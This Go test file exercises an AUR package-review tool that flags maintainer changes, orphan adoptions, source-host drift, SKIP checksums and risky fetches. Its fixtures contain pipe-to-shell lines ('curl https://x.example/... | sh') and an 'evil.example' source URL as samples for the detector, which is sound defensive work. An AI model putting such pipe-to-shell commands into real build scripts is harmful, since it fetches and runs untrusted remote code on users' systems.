package aurreview_test

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"

	"github.com/jyablonski/arc/internal/aurreview"
	"github.com/jyablonski/arc/internal/boundary"
	"github.com/stretchr/testify/require"
)

type pkgMeta struct {
	base         string
	version      string
	maintainer   *string // nil = orphaned
	outOfDate    *int64
	lastModified int64
	pkgbuild     string            // shorthand for files["PKGBUILD"]
	files        map[string]string // full snapshot; nil -> {"PKGBUILD": pkgbuild}
	noSnapshot   bool              // snapshot endpoint 503s -> exercises the plain fallback
}

func (m pkgMeta) snapshotFiles() map[string]string {
	if m.files != nil {
		return m.files
	}
	return map[string]string{"PKGBUILD": m.pkgbuild}
}

func jsonResp(status int, body string) *http.Response {
	return &http.Response{StatusCode: status, Body: io.NopCloser(strings.NewReader(body)), Header: make(http.Header)}
}

func rawResp(status int, body []byte) *http.Response {
	return &http.Response{StatusCode: status, Body: io.NopCloser(bytes.NewReader(body)), Header: make(http.Header)}
}

func targz(t *testing.T, base string, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, content := range files {
		require.NoError(t, tw.WriteHeader(&tar.Header{
			Name: base + "/" + name, Mode: 0o644, Size: int64(len(content)), Typeflag: tar.TypeReg,
		}))
		_, err := tw.Write([]byte(content))
		require.NoError(t, err)
	}
	require.NoError(t, tw.Close())
	require.NoError(t, gz.Close())
	return buf.Bytes()
}

// router fakes the AUR: the RPC info endpoint emits one result per requested
// arg[], the snapshot endpoint serves each package's files as a tar.gz, and
// cgit plain serves the PKGBUILD (the degraded path). scanned (if non-nil)
// records every pkgbase whose files were fetched, so tests can assert gating;
// scans run concurrently, so recording is mutex-guarded.
func router(t *testing.T, meta map[string]pkgMeta, scanned *[]string) func(*http.Request) (*http.Response, error) {
	baseOf := func(name string, m pkgMeta) string {
		if m.base != "" {
			return m.base
		}
		return name
	}
	byBase := func(base string) (pkgMeta, bool) {
		for n, m := range meta {
			if baseOf(n, m) == base {
				return m, true
			}
		}
		return pkgMeta{}, false
	}
	var mu sync.Mutex
	record := func(base string) {
		if scanned == nil {
			return
		}
		mu.Lock()
		defer mu.Unlock()
		*scanned = append(*scanned, base)
	}
	return func(req *http.Request) (*http.Response, error) {
		u := req.URL
		if strings.Contains(u.Path, "/rpc/") {
			var results []string
			for _, n := range u.Query()["arg[]"] {
				m, ok := meta[n]
				if !ok {
					continue
				}
				maint := "null"
				if m.maintainer != nil {
					maint = strconv.Quote(*m.maintainer)
				}
				ood := "null"
				if m.outOfDate != nil {
					ood = strconv.FormatInt(*m.outOfDate, 10)
				}
				results = append(results, fmt.Sprintf(
					`{"Name":%q,"PackageBase":%q,"Version":%q,"Maintainer":%s,"OutOfDate":%s,"LastModified":%d}`,
					n, baseOf(n, m), m.version, maint, ood, m.lastModified))
			}
			body := fmt.Sprintf(`{"type":"multiinfo","resultcount":%d,"results":[%s]}`,
				len(results), strings.Join(results, ","))
			return jsonResp(http.StatusOK, body), nil
		}
		if strings.Contains(u.Path, "/snapshot/") {
			base := strings.TrimSuffix(path.Base(u.Path), ".tar.gz")
			record(base)
			if m, ok := byBase(base); ok && !m.noSnapshot {
				return rawResp(http.StatusOK, targz(t, base, m.snapshotFiles())), nil
			}
			return jsonResp(http.StatusServiceUnavailable, ""), nil
		}
		// cgit plain file fetch (fallback path).
		base := u.Query().Get("h")
		record(base)
		if m, ok := byBase(base); ok {
			if body, ok := m.snapshotFiles()[strings.TrimPrefix(path.Base(u.Path), "plain/")]; ok {
				return jsonResp(http.StatusOK, body), nil
			}
		}
		return jsonResp(http.StatusNotFound, ""), nil
	}
}

func newReviewer(statePath string, do func(*http.Request) (*http.Response, error)) *aurreview.Reviewer {
	return &aurreview.Reviewer{HTTP: &boundary.HTTPDoerMock{DoFunc: do}, StatePath: statePath}
}

func seedBaseline(t *testing.T, path string, m map[string]map[string]any) {
	t.Helper()
	b, err := json.Marshal(m)
	require.NoError(t, err)
	require.NoError(t, os.WriteFile(path, b, 0o600))
}

func findingFor(findings []aurreview.Finding, pkg string, sev aurreview.Severity, substr string) bool {
	for _, f := range findings {
		if f.Pkg == pkg && f.Severity == sev && strings.Contains(f.Message, substr) {
			return true
		}
	}
	return false
}

func TestReview_firstRun_noMaintainerFindingsButScansUpdate(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "nested", "aur-provenance.json") // dir absent on purpose
	meta := map[string]pkgMeta{
		"foo": {version: "2.0", maintainer: new("alice"), lastModified: 10, pkgbuild: "pkgname=foo\nbuild() { npm install }\n"},
	}
	rv := newReviewer(statePath, router(t, meta, nil))

	// installed at older version -> pending update -> scanned.
	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
	require.NoError(t, err)

	// No baseline yet, so no maintainer-change finding.
	require.False(t, findingFor(res.Findings, "foo", aurreview.High, "maintainer changed"))
	// The pending update was scanned and the npm fetch surfaced.
	require.True(t, findingFor(res.Findings, "foo", aurreview.High, "node-ecosystem fetch"))

	// Review must NOT write the baseline.
	_, statErr := os.Stat(statePath)
	require.True(t, os.IsNotExist(statErr))

	// Commit writes it (creating the missing dir), including the trust marker.
	require.NoError(t, rv.Commit(res))
	raw, err := os.ReadFile(statePath)
	require.NoError(t, err)
	require.Contains(t, string(raw), `"maintainer": "alice"`)
	require.Contains(t, string(raw), `"last_modified": 10`)
}

func TestReview_maintainerChangeFlagged(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	seedBaseline(t, statePath, map[string]map[string]any{
		"foo": {"maintainer": "alice", "version": "1.0", "seen_at": 1700000000},
	})
	meta := map[string]pkgMeta{
		"foo": {version: "1.0", maintainer: new("mallory"), pkgbuild: "pkgname=foo\n"},
	}
	rv := newReviewer(statePath, router(t, meta, nil))

	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
	require.NoError(t, err)
	require.True(t, findingFor(res.Findings, "foo", aurreview.High, `"alice" -> "mallory"`))
	// Most-severe-first ordering.
	require.Equal(t, aurreview.High, res.Findings[0].Severity)
}

func TestReview_orphanAdoptionFlagged(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	// Both packages were tracked as orphans; mallory adopted them both.
	seedBaseline(t, statePath, map[string]map[string]any{
		"foo": {"maintainer": "", "version": "1.0", "seen_at": 1700000000},
		"bar": {"maintainer": "", "version": "1.0", "seen_at": 1700000000},
	})
	meta := map[string]pkgMeta{
		"foo": {version: "1.0", maintainer: new("mallory"), lastModified: 5, pkgbuild: "pkgname=foo\n"},
		"bar": {version: "1.0", maintainer: new("mallory"), lastModified: 5, pkgbuild: "pkgname=bar\n"},
	}
	rv := newReviewer(statePath, router(t, meta, nil))

	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0", "bar": "1.0"})
	require.NoError(t, err)
	require.True(t, findingFor(res.Findings, "foo", aurreview.High, `adopted by "mallory"`))
	require.True(t, findingFor(res.Findings, "bar", aurreview.High, `adopted by "mallory"`))
	// Adoptions feed cluster detection too.
	require.True(t, findingFor(res.Findings, "bar,foo", aurreview.High, "CLUSTER"))
}

func TestReview_deletedFromAURFlagged(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	seedBaseline(t, statePath, map[string]map[string]any{
		"gone": {"maintainer": "alice", "version": "1.0", "seen_at": 1700000000},
	})
	rv := newReviewer(statePath, router(t, map[string]pkgMeta{}, nil))

	res, err := rv.Review(context.Background(), map[string]string{"gone": "1.0", "never-tracked-local-pkg": "1.0"})
	require.NoError(t, err)
	require.True(t, findingFor(res.Findings, "gone", aurreview.Warn, "no longer exists in the AUR"))
	// Locally built packages that were never in the baseline stay quiet.
	require.False(t, findingFor(res.Findings, "never-tracked-local-pkg", aurreview.Warn, "no longer exists"))

	// The baseline entry survives Commit so a re-submission under a different
	// account still trips the maintainer-change check.
	require.NoError(t, rv.Commit(res))
	raw, err := os.ReadFile(statePath)
	require.NoError(t, err)
	require.Contains(t, string(raw), `"gone"`)
}

func TestReview_clusterDetection(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	seedBaseline(t, statePath, map[string]map[string]any{
		"foo": {"maintainer": "alice", "version": "1.0", "seen_at": 1700000000},
		"bar": {"maintainer": "bob", "version": "1.0", "seen_at": 1700000000},
	})
	meta := map[string]pkgMeta{
		"foo": {version: "1.0", maintainer: new("mallory"), pkgbuild: "pkgname=foo\n"},
		"bar": {version: "1.0", maintainer: new("mallory"), pkgbuild: "pkgname=bar\n"},
	}
	rv := newReviewer(statePath, router(t, meta, nil))

	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0", "bar": "1.0"})
	require.NoError(t, err)
	require.True(t, findingFor(res.Findings, "bar,foo", aurreview.High, "CLUSTER"))
}

func TestReview_scanGatedToInterestingPackages(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	seedBaseline(t, statePath, map[string]map[string]any{
		"stable": {"maintainer": "alice", "version": "1.0", "seen_at": 1700000000},
		"bumped": {"maintainer": "bob", "version": "1.0", "seen_at": 1700000000},
	})
	meta := map[string]pkgMeta{
		// unchanged version + unchanged maintainer -> must NOT be scanned.
		"stable": {version: "1.0", maintainer: new("alice"), pkgbuild: "pkgname=stable\n"},
		// version bump -> scanned.
		"bumped": {version: "2.0", maintainer: new("bob"), lastModified: 2, pkgbuild: "pkgname=bumped\n"},
	}
	var scanned []string
	rv := newReviewer(statePath, router(t, meta, &scanned))

	_, err := rv.Review(context.Background(), map[string]string{"stable": "1.0", "bumped": "1.0"})
	require.NoError(t, err)
	require.Contains(t, scanned, "bumped")
	require.NotContains(t, scanned, "stable")
}

func TestReview_unchangedContentNotRescanned(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	// VCS-style package: AUR version never matches the installed one, so it is
	// perpetually "pending" — but nothing was pushed since the last trusted run
	// (last_modified matches), so there is nothing new to scan.
	seedBaseline(t, statePath, map[string]map[string]any{
		"foo-git": {"maintainer": "alice", "version": "2.0", "seen_at": 1700000000, "last_modified": 7},
	})
	meta := map[string]pkgMeta{
		"foo-git": {version: "2.0", maintainer: new("alice"), lastModified: 7, pkgbuild: "pkgname=foo-git\n"},
	}
	var scanned []string
	rv := newReviewer(statePath, router(t, meta, &scanned))

	_, err := rv.Review(context.Background(), map[string]string{"foo-git": "1.0"})
	require.NoError(t, err)
	require.Empty(t, scanned)
}

func TestReview_splitPackagesScannedOnce(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	meta := map[string]pkgMeta{
		"foo":     {base: "foo", version: "2.0", maintainer: new("alice"), lastModified: 1, pkgbuild: "pkgname=foo\n"},
		"foo-doc": {base: "foo", version: "2.0", maintainer: new("alice"), lastModified: 1, pkgbuild: "pkgname=foo\n"},
	}
	var scanned []string
	rv := newReviewer(statePath, router(t, meta, &scanned))

	_, err := rv.Review(context.Background(), map[string]string{"foo": "1.0", "foo-doc": "1.0"})
	require.NoError(t, err)
	require.Equal(t, []string{"foo"}, scanned)
}

func TestReview_skipScanAggregatesAndIgnoresComments(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	// Mirrors spotify's PKGBUILD: real SKIP assignments plus SKIP/Skip in
	// comments that must NOT be flagged.
	pkgbuild := strings.Join([]string{
		"pkgname=spotify",
		"sha512sums=('SKIP'",          // line 2: real
		`# Skip "Release" files`,      // line 3: comment, mixed case
		"# set them to SKIP manually", // line 4: comment, uppercase
		"sha512sums[4]='SKIP'",        // line 5: real
		"sha512sums[6]='SKIP')",       // line 6: real
	}, "\n")
	meta := map[string]pkgMeta{
		"spotify": {version: "2.0", maintainer: new("alice"), lastModified: 1, pkgbuild: pkgbuild},
	}
	rv := newReviewer(statePath, router(t, meta, nil))

	res, err := rv.Review(context.Background(), map[string]string{"spotify": "1.0"})
	require.NoError(t, err)

	// Exactly one aggregated SKIP finding, covering only the 3 real lines.
	var skip []aurreview.Finding
	for _, f := range res.Findings {
		if strings.Contains(f.Message, "SKIP checksum") {
			skip = append(skip, f)
		}
	}
	require.Len(t, skip, 1)
	require.Contains(t, skip[0].Message, "3 line(s)")
	require.Equal(t, "PKGBUILD:2,5,6", skip[0].Location)
	require.Equal(t, 1, res.Pending)
}

func TestReview_diffScanOnlyFlagsNewLines(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	cacheDir := filepath.Join(dir, "aur-files")

	// Run 1: npm install is present and flagged; commit trusts the snapshot.
	v1 := map[string]pkgMeta{
		"foo": {version: "2.0", maintainer: new("alice"), lastModified: 1,
			pkgbuild: "pkgname=foo\nbuild() {\n  npm install\n}\n"},
	}
	rv := newReviewer(statePath, router(t, v1, nil))
	rv.CacheDir = cacheDir
	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
	require.NoError(t, err)
	require.True(t, findingFor(res.Findings, "foo", aurreview.High, "node-ecosystem fetch"))
	require.NoError(t, rv.Commit(res))
	require.FileExists(t, filepath.Join(cacheDir, "foo", "PKGBUILD"))

	// Run 2: same npm line (already vetted) plus a new pipe-to-shell line.
	// Only the new line may be flagged.
	v2 := map[string]pkgMeta{
		"foo": {version: "3.0", maintainer: new("alice"), lastModified: 2,
			pkgbuild: "pkgname=foo\nbuild() {\n  npm install\n  curl https://x.example/s.sh | sh\n}\n"},
	}
	rv2 := newReviewer(statePath, router(t, v2, nil))
	rv2.CacheDir = cacheDir
	res2, err := rv2.Review(context.Background(), map[string]string{"foo": "2.0"})
	require.NoError(t, err)
	require.True(t, findingFor(res2.Findings, "foo", aurreview.High, "pipe-to-shell"))
	require.False(t, findingFor(res2.Findings, "foo", aurreview.High, "node-ecosystem fetch"))
}

func TestReview_urlHostDriftFlagged(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	cacheDir := filepath.Join(dir, "aur-files")

	v1 := map[string]pkgMeta{
		"foo": {version: "2.0", maintainer: new("alice"), lastModified: 1,
			pkgbuild: "pkgname=foo\nsource=(\"https://github.com/foo/foo.tar.gz\")\n"},
	}
	rv := newReviewer(statePath, router(t, v1, nil))
	rv.CacheDir = cacheDir
	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
	require.NoError(t, err)
	require.NoError(t, rv.Commit(res))

	// The source URL moved to a different host: the upstream-hijack tell.
	v2 := map[string]pkgMeta{
		"foo": {version: "3.0", maintainer: new("alice"), lastModified: 2,
			pkgbuild: "pkgname=foo\nsource=(\"https://evil.example/foo.tar.gz\")\n"},
	}
	rv2 := newReviewer(statePath, router(t, v2, nil))
	rv2.CacheDir = cacheDir
	res2, err := rv2.Review(context.Background(), map[string]string{"foo": "2.0"})
	require.NoError(t, err)
	require.True(t, findingFor(res2.Findings, "foo", aurreview.High, "URL hosts changed"))
	require.True(t, findingFor(res2.Findings, "foo", aurreview.High, "evil.example"))
}

func TestReview_lockfilePinnedFetchDowngraded(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	meta := map[string]pkgMeta{
		"foo": {version: "2.0", maintainer: new("alice"), lastModified: 1,
			pkgbuild: "pkgname=foo\nbuild() {\n  npm ci\n  cargo fetch --locked\n}\n"},
	}
	rv := newReviewer(statePath, router(t, meta, nil))

	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
	require.NoError(t, err)
	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "node-ecosystem fetch (lockfile-pinned)"))
	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "cargo fetch (lockfile-pinned)"))
	for _, f := range res.Findings {
		require.NotEqual(t, aurreview.High, f.Severity)
	}
}

func TestReview_snapshotScansAllFilesAndFlagsBinaries(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	meta := map[string]pkgMeta{
		"foo": {version: "2.0", maintainer: new("alice"), lastModified: 1,
			files: map[string]string{
				"PKGBUILD":    "pkgname=foo\nsource=(\"helper.sh\")\n",
				"helper.sh":   "curl https://x.example/p.sh | sh\n", // payload outside the PKGBUILD
				"payload.bin": "\x00\x01\x02binary",
			}},
	}
	rv := newReviewer(statePath, router(t, meta, nil))

	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
	require.NoError(t, err)
	require.True(t, findingFor(res.Findings, "foo", aurreview.High, "pipe-to-shell"))
	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "binary or oversized file"))
}

func TestReview_snapshotFallsBackToPlainFetch(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	meta := map[string]pkgMeta{
		"foo": {version: "2.0", maintainer: new("alice"), lastModified: 1, noSnapshot: true,
			pkgbuild: "pkgname=foo\nbuild() { npm install }\n"},
	}
	rv := newReviewer(statePath, router(t, meta, nil))

	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
	require.NoError(t, err)
	require.True(t, findingFor(res.Findings, "foo", aurreview.High, "node-ecosystem fetch"))
}

func TestReview_orphanAndOutOfDate(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	ood := int64(1700000000)
	meta := map[string]pkgMeta{
		"foo": {version: "1.0", maintainer: nil, outOfDate: &ood, lastModified: 1, pkgbuild: "pkgname=foo\n"},
	}
	rv := newReviewer(statePath, router(t, meta, nil))

	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
	require.NoError(t, err)
	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "ORPHANED"))
	require.True(t, findingFor(res.Findings, "foo", aurreview.Info, "flagged out-of-date"))
}

func TestReview_fileFetchFailsYieldsWarning(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	do := func(req *http.Request) (*http.Response, error) {
		if strings.Contains(req.URL.Path, "/rpc/") {
			return jsonResp(http.StatusOK,
				`{"type":"multiinfo","resultcount":1,"results":[{"Name":"foo","PackageBase":"foo","Version":"2.0","Maintainer":"alice","LastModified":1}]}`), nil
		}
		return jsonResp(http.StatusServiceUnavailable, "down"), nil
	}
	rv := newReviewer(statePath, do)

	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
	require.NoError(t, err)
	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "could not fetch files for scan"))
}

func TestReview_rpcErrorResponse(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	do := func(req *http.Request) (*http.Response, error) {
		return jsonResp(http.StatusOK, `{"type":"error","error":"too many package results"}`), nil
	}
	rv := newReviewer(statePath, do)

	_, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
	require.Error(t, err)
	require.Contains(t, err.Error(), "too many package results")
}

func TestReview_rpcNon200(t *testing.T) {
	dir := t.TempDir()
	statePath := filepath.Join(dir, "state.json")
	do := func(req *http.Request) (*http.Response, error) {
		return jsonResp(http.StatusTooManyRequests, "rate limited"), nil
	}
	rv := newReviewer(statePath, do)

	_, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
	require.Error(t, err)
	require.Contains(t, err.Error(), "429")
}

func TestSeverityString(t *testing.T) {
	require.Equal(t, "HIGH", aurreview.High.String())
	require.Equal(t, "WARN", aurreview.Warn.String())
	require.Equal(t, "INFO", aurreview.Info.String())
}

func TestDefaultStatePath_xdg(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", "/tmp/xdgstate")
	p, err := aurreview.DefaultStatePath()
	require.NoError(t, err)
	require.Equal(t, "/tmp/xdgstate/arc/aur-provenance.json", p)
}
